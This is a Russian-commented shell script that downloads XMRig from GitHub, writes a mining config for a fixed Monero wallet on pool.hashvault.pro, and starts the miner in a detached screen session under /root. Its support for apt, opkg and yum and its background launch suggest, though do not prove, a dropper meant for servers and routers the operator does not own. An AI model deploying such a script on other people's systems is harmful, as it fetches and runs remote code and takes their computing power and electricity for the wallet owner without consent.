#!/bin/sh
# Universal XMRig Installer with fixed URLs
echo "[+] Installing XMRig Miner..."

# Устанавливаем зависимости
if command -v apt >/dev/null 2>&1; then
    apt update
    apt install -y wget tar screen
elif command -v opkg >/dev/null 2>&1; then
    opkg update
    opkg install wget tar screen
elif command -v yum >/dev/null 2>&1; then
    yum install -y wget tar screen
fi

# Создаем директорию
mkdir -p /root/xmrig_miner
cd /root/xmrig_miner

# Определяем архитектуру
ARCH=$(uname -m)
echo "[+] Architecture: $ARCH"

# ПРАВИЛЬНЫЕ ссылки для каждой архитектуры
case $ARCH in
    "x86_64"|"amd64")
        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz"
        ;;
    "aarch64"|"arm64")
        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-arm64.tar.gz"
        ;;
    "armv7l"|"armhf")
        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-armhf.tar.gz"
        ;;
    *)
        XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz"
        ;;
esac

echo "[+] Downloading: $XMRIG_URL"

# Скачиваем через wget (более стабильный чем curl)
wget -O xmrig.tar.gz "$XMRIG_URL" || {
    echo "[-] Download failed, trying alternative..."
    # Альтернативная ссылка
    wget -O xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-${ARCH}.tar.gz"
}

# Проверяем скачивание
if [ ! -f "xmrig.tar.gz" ]; then
    echo "[-] Critical: Cannot download XMRig!"
    echo "[+] Trying direct download from mirror..."
    wget -O xmrig.tar.gz "https://xmrig.com/download/xmrig-6.20.0-linux-${ARCH}.tar.gz"
fi

if [ ! -f "xmrig.tar.gz" ]; then
    echo "[-] All download attempts failed!"
    exit 1
fi

echo "[+] Extracting XMRig..."
tar -xzf xmrig.tar.gz --strip-components=1

# Ищем бинарник
if [ ! -f "xmrig" ]; then
    find . -name "xmrig" -exec cp {} . \;
    chmod +x xmrig
fi

# Создаем конфиг
cat > config.json << 'END_CONFIG'
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "coin": "monero",
            "algo": "rx/0",
            "url": "pool.hashvault.pro:443",
            "user": "87N1Fb1gkypZgnPB4ysPXj3L1J8YR7EK2JpLJX9w6yDpVs7FXUJH7zc996sbnhJ3sU51MrBzTPLMJW8JCmJehNci9E8Jw5N",
            "pass": "x",
            "tls": true
        }
    ]
}
END_CONFIG

# Запускаем через screen
echo "[+] Starting XMRig..."
screen -dmS xmrig ./xmrig -c config.json

echo "[+] Installation complete!"
echo "[+] Use: screen -r xmrig"
